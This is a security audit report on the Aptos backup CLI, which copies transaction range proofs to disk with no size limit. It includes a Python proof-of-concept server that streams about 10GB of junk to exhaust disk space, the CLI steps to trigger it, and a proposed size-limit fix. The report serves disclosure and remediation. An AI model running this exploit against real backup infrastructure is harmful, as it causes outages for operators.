# Audit Report

## Title
Resource Exhaustion via Unbounded Proof Data Copying in Transaction Backup

## Summary
The `write_chunk()` function in the transaction backup controller copies transaction range proofs from the backup service to disk using `tokio::io::copy()` without any size validation. A malicious or compromised backup service can send arbitrarily large fake proof data to exhaust disk space on the backup infrastructure.

## Finding Description

The transaction backup process relies on a configurable backup service to provide transaction data and cryptographic proofs. [1](#0-0) 

In this code, `tokio::io::copy()` streams proof data directly from the backup service to disk without any size checks. The backup service address is user-configurable via the `--backup-service-address` parameter. [2](#0-1) 

The client makes unauthenticated HTTP requests to the backup service endpoint. [3](#0-2) 

While legitimate `TransactionAccumulatorRangeProof` structures contain vectors of hash values (typically a few KB in size), there is no enforcement of this on the client side. [4](#0-3) 

The system does have a `max_chunk_size` configuration (default 128MB), but this only applies to transaction data chunks, not proof files. [5](#0-4) 

**Attack Scenario:**
1. Attacker runs a malicious HTTP server mimicking the backup service API
2. Victim operator runs backup CLI: `aptos-backup-cli backup transaction --backup-service-address http://malicious-server:6186 --start-version 0 --num-transactions 1000000`
3. For each chunk's `transaction_range_proof/{first}/{last}` request, malicious server responds with gigabytes of junk data
4. `tokio::io::copy()` writes all data to disk without validation
5. Disk space exhausted, causing backup failures and potential cascading failures if disk is shared with other services

The proof validation only occurs during the restore phase, not during backup, so the damage is done before any validation can reject invalid data. [6](#0-5) 

## Impact Explanation

This vulnerability qualifies as **Medium Severity** under Aptos bug bounty criteria: "State inconsistencies requiring intervention."

**Impact:**
- Disk exhaustion on backup infrastructure disrupts backup operations
- Failed backups compromise disaster recovery capabilities
- If backup server shares disk with other services, cascading failures possible
- Requires manual intervention to clean up disk and restore operations

**Limitations:**
- Does not directly affect consensus nodes or validators
- Does not compromise blockchain state or funds
- Requires operator misconfiguration or backup service compromise
- Impact limited to backup infrastructure availability

## Likelihood Explanation

**Likelihood: Medium**

**Factors increasing likelihood:**
- Backup service address is configurable without validation
- No authentication or authorization checks on backup service
- HTTP (not HTTPS) commonly used in internal deployments
- Operators may point to development/testing servers accidentally
- Backup service compromise is a realistic threat vector

**Factors decreasing likelihood:**
- Requires attacker to control the backup service endpoint (via compromise, MITM, or operator misconfiguration)
- Typically deployed in trusted network environments
- Operators likely monitor backup operations

## Recommendation

Implement size limits on proof data before copying to disk:

```rust
async fn write_chunk(
    &self,
    backup_handle: &BackupHandleRef,
    chunk_bytes: &[u8],
    first_version: u64,
    last_version: u64,
) -> Result<TransactionChunk> {
    // Maximum reasonable proof size: ~1MB should be more than enough
    // for any legitimate accumulator proof
    const MAX_PROOF_SIZE: u64 = 1_048_576; // 1MB
    
    let (proof_handle, mut proof_file) = self
        .storage
        .create_for_write(
            backup_handle,
            &Self::chunk_proof_name(first_version, last_version),
        )
        .await?;
    
    let mut proof_reader = self
        .client
        .get_transaction_range_proof(first_version, last_version)
        .await?;
    
    // Copy with size limit
    let bytes_copied = tokio::io::copy(&mut proof_reader.take(MAX_PROOF_SIZE), &mut proof_file)
        .await?;
    
    // Verify we haven't hit the limit (which would indicate truncation)
    let mut remaining = [0u8; 1];
    let additional = proof_reader.read(&mut remaining).await?;
    ensure!(
        additional == 0,
        "Proof data exceeds maximum allowed size of {} bytes",
        MAX_PROOF_SIZE
    );
    
    proof_file.shutdown().await?;
    // ... rest of function
}
```

**Additional recommendations:**
1. Implement mutual TLS authentication for backup service connections
2. Add configurable size limits with reasonable defaults
3. Consider validating proof structure during backup (not just restore)
4. Add disk space monitoring with alerts before exhaustion
5. Implement rate limiting on backup operations

## Proof of Concept

**Malicious Backup Service (Python):**
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import time

class MaliciousBackupHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if 'transaction_range_proof' in self.path:
            # Send headers
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.end_headers()
            
            # Send gigabytes of junk data
            chunk = b'X' * (1024 * 1024)  # 1MB chunks
            for _ in range(10000):  # 10GB total
                self.wfile.write(chunk)
                time.sleep(0.001)  # Slow drip to avoid timeout
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 6186), MaliciousBackupHandler)
    print("Malicious backup service running on port 6186")
    server.serve_forever()
```

**Exploitation Steps:**
```bash
# 1. Start malicious server
python3 malicious_backup_service.py

# 2. Run backup CLI pointing to malicious server
# (In a real scenario, this could happen via misconfiguration or MITM)
aptos-backup-cli backup transaction \
    --backup-service-address http://localhost:6186 \
    --start-version 0 \
    --num-transactions 1000 \
    --target-db-dir /path/to/backup

# 3. Observe disk filling up rapidly with invalid proof files
df -h /path/to/backup
```

**Expected Result:** Disk space exhausted, backup fails, system requires manual cleanup.

## Notes

This vulnerability demonstrates a violation of the documented invariant: "Resource Limits: All operations must respect gas, storage, and computational limits." The backup process does not enforce storage limits on untrusted input from the backup service, enabling resource exhaustion attacks.

While the impact is limited to backup infrastructure rather than consensus or validator nodes, it represents a real security concern for operational resilience and disaster recovery capabilities of Aptos deployments.

### Citations

**File:** storage/backup/backup-cli/src/backup_types/transaction/backup.rs (L163-170)
```rust
        tokio::io::copy(
            &mut self
                .client
                .get_transaction_range_proof(first_version, last_version)
                .await?,
            &mut proof_file,
        )
        .await?;
```

**File:** storage/backup/backup-cli/src/utils/backup_service_client.rs (L23-31)
```rust
pub struct BackupServiceClientOpt {
    #[clap(
        long = "backup-service-address",
        default_value = "http://localhost:6186",
        help = "Backup service address. By default a Aptos Node runs the backup service serving \
        on tcp port 6186 to localhost only."
    )]
    pub address: String,
}
```

**File:** storage/backup/backup-cli/src/utils/backup_service_client.rs (L159-169)
```rust
    pub async fn get_transaction_range_proof(
        &self,
        first_version: Version,
        last_version: Version,
    ) -> Result<impl AsyncRead + use<>> {
        self.get(
            "transaction_range_proof",
            &format!("{}/{}", first_version, last_version,),
        )
        .await
    }
```

**File:** types/src/proof/definition.rs (L576-586)
```rust
pub struct AccumulatorRangeProof<H> {
    /// The siblings on the left of the path from the first leaf to the root. Siblings are ordered
    /// from the bottom level to the root level.
    left_siblings: Vec<HashValue>,

    /// The sliblings on the right of the path from the last leaf to the root. Siblings are ordered
    /// from the bottom level to the root level.
    right_siblings: Vec<HashValue>,

    phantom: PhantomData<H>,
}
```

**File:** storage/backup/backup-cli/src/utils/mod.rs (L51-57)
```rust
    // Defaults to 128MB, so concurrent chunk downloads won't take up too much memory.
    #[clap(
        long = "max-chunk-size",
        default_value_t = 134217728,
        help = "Maximum chunk file size in bytes."
    )]
    pub max_chunk_size: usize,
```

**File:** storage/backup/backup-cli/src/backup_types/transaction/restore.rs (L100-130)
```rust
    async fn load(
        manifest: TransactionChunk,
        storage: &Arc<dyn BackupStorage>,
        epoch_history: Option<&Arc<EpochHistory>>,
    ) -> Result<Self> {
        let mut file = BufReader::new(storage.open_for_read(&manifest.transactions).await?);
        let mut txns = Vec::new();
        let mut persisted_aux_info = Vec::new();
        let mut txn_infos = Vec::new();
        let mut event_vecs = Vec::new();
        let mut write_sets = Vec::new();

        while let Some(record_bytes) = file.read_record_bytes().await? {
            let (txn, aux_info, txn_info, events, write_set): (
                _,
                PersistedAuxiliaryInfo,
                _,
                _,
                WriteSet,
            ) = match manifest.format {
                TransactionChunkFormat::V0 => {
                    let (txn, txn_info, events, write_set) = bcs::from_bytes(&record_bytes)?;
                    (
                        txn,
                        PersistedAuxiliaryInfo::None,
                        txn_info,
                        events,
                        write_set,
                    )
                },
                TransactionChunkFormat::V1 => bcs::from_bytes(&record_bytes)?,
```
